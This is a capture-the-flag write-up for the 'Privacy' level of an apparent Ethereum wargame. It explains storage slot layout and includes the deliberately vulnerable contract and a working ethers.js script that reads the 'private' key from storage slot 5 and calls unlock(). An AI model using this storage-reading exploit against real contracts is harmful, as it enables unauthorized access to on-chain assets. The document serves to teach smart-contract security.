# 12 - Privacy

### Notes

Storage is an array of 2\*\*256 32-byte slots. Values are written into storage in the order in which they are declared. Neighboring values may be packed right-to-left into the same slot (if they fit).

When bytes32 is converted into bytes16, Solidity takes the first 16 bytes (or 32 digits in hexadecimal).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {
    // Slot 0
    bool public locked = true; // 1 byte
    // Slot 1
    uint256 public ID = block.timestamp; // 32 bytes
    // Slot 2
    uint8 private flattening = 10; // 1 byte
    uint8 private denomination = 255; // 1 byte
    uint16 private awkwardness = uint16(now); // 2 bytes
    // Slots 3, 4, 5
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) public {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        // require _key == bytes16 in slot 5
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

### Scripted Solution

```javascript
const fs = require('fs')
const ethers = require('ethers')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { provider, contract: privacyContract } = await setup('Privacy')

  // Get key from contract storage slot
  console.log('Getting key from contract storage...')
  const keySlot = 5
  const key = await provider.getStorageAt(privacyContract.address, keySlot)
  // Convert 32 byte `key` to bytes16 by taking first 34 characters of the string
  const bytes16Key = key.split('').slice(0, 34).join('')
  console.log(`Bytes16 key: ${bytes16Key}`)

  // Unlock contract by calling `unlock` with bytes16 key
  console.log('Unlocking contract with key...')
  const unlock = await privacyContract.unlock(bytes16Key)
  await unlock.wait(1)

  // // Confirm contract is unlocked
  console.log(`Contract locked: ${await privacyContract.locked()}.`)
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
